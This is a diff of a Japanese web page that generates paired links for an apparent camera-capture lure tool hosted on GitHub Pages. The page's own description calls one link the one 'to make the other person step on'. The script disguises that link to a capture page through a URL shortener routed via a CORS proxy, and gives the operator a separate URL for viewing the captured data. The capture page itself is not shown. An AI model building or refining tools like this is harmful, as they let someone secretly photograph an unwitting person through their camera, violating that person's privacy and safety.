@@ -1,53 +1,128 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- OGP設定 -->
+  <meta property="og:title" content="カメラ撮影ツール">
+  <meta property="og:description" content="相手に踏ませる用、撮影データ確認用URLを自動生成します">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://ginginman-infinity.github.io/-/generate.html">
+  <meta name="twitter:card" content="summary">
+
   <title>撮影URL生成ツール</title>
+
   <style>
     body {
-      font-family: sans-serif;
-      background: #222;
-      color: white;
+      font-family: system-ui, sans-serif;
       text-align: center;
-      padding: 50px;
-    }
-    input, button {
-      font-size: 1rem;
-      padding: 10px;
-      border-radius: 8px;
-      border: none;
+      padding: 40px;
+      background: #f8fafc;
     }
     button {
-      background: orange;
-      color: black;
+      padding: 10px 20px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
+      background: #3b82f6;
+      color: white;
+      margin: 10px;
     }
     .url-box {
-      margin-top: 20px;
-      background: #333;
-      padding: 15px;
+      background: white;
       border-radius: 8px;
-      word-wrap: break-word;
+      padding: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 500px;
+      margin: 20px auto;
+      word-break: break-all;
+    }
+    .label {
+      font-weight: bold;
+      color: #475569;
+    }
+    .copy-btn {
+      background: #10b981;
+    }
+    .copied {
+      background: #16a34a !important;
     }
   </style>
 </head>
 <body>
-  <h1>撮影URL生成ツール</h1>
-  <button id="generateBtn">URLを生成する</button>
+  <h1>📸 カメラ撮影URL生成ツール</h1>
+  <p>ボタンを押すと、相手用（短縮URL）と確認用URLが自動で作られます。</p>
 
-  <div id="result" class="url-box"></div>
+  <button id="generateBtn">リンクを生成する</button>
+
+  <div id="result" class="url-box" style="display:none;">
+    <p>
+      <span class="label">相手用URL（短縮済み）：</span><br>
+      <a id="targetLink" href="#" target="_blank"></a><br>
+      <button class="copy-btn" id="copyTarget">📋 コピー</button>
+    </p>
+    <hr>
+    <p>
+      <span class="label">確認用URL：</span><br>
+      <a id="checkLink" href="#" target="_blank"></a><br>
+      <button class="copy-btn" id="copyCheck">📋 コピー</button>
+    </p>
+  </div>
 
   <script>
-    const generateBtn = document.getElementById("generateBtn");
-    const result = document.getElementById("result");
+  // --- URL短縮関数（is.gd + alloriginsでCORS回避）---
+  async function shortenUrl(longUrl) {
+    try {
+      const proxy = "https://api.allorigins.win/raw?url=";
+      const apiUrl = `https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`;
+      const response = await fetch(proxy + encodeURIComponent(apiUrl));
+      const shortUrl = await response.text();
+      return shortUrl.trim();
+    } catch (error) {
+      console.error("短縮に失敗しました:", error);
+      return longUrl;
+    }
+  }
 
-    generateBtn.addEventListener("click", () => {
-      const randomId = Math.random().toString(36).substring(2, 8);
-      const base = "https://github.com/ginginman-Infinity/-";
-      const captureURL = `${base}/index.html?id=${randomId}`;
-      const checkURL = `${base}/check.html?id=${randomId}`;
+  // --- コピー機能 ---
+  function copyText(text, button) {
+    navigator.clipboard.writeText(text).then(() => {
+      button.textContent = "✅ コピー済み";
+      button.classList.add("copied");
+      setTimeout(() => {
+        button.textContent = "📋 コピー";
+        button.classList.remove("copied");
+      }, 1500);
+    });
+  }
 
-      result.innerHTML = `
-        ✅ <b>相手が開く用URL</b><br>
-        <a href="${captureURL}" target="_blank" style="color:
+  // --- 生成ボタン処理 ---
+  document.getElementById("generateBtn").addEventListener("click", async () => {
+    const id = Math.random().toString(36).substring(2, 9);
+
+    // あなたのGitHub PagesベースURL
+    const baseUrl = "https://ginginman-infinity.github.io/-/";
+
+    const targetUrl = `${baseUrl}index.html?id=${id}`;  // 相手用（撮影ページ）
+    const checkUrl = `${baseUrl}check.html?id=${id}`;   // 確認用
+
+    // 相手用URLを短縮
+    const shortTargetUrl = await shortenUrl(targetUrl);
+
+    // 表示
+    document.getElementById("targetLink").textContent = shortTargetUrl;
+    document.getElementById("targetLink").href = shortTargetUrl;
+    document.getElementById("checkLink").textContent = checkUrl;
+    document.getElementById("checkLink").href = checkUrl;
+    document.getElementById("result").style.display = "block";
+
+    // コピー機能セット
+    document.getElementById("copyTarget").onclick = () => copyText(shortTargetUrl, document.getElementById("copyTarget"));
+    document.getElementById("copyCheck").onclick = () => copyText(checkUrl, document.getElementById("copyCheck"));
+  });
+  </script>
+</body>
+</html>
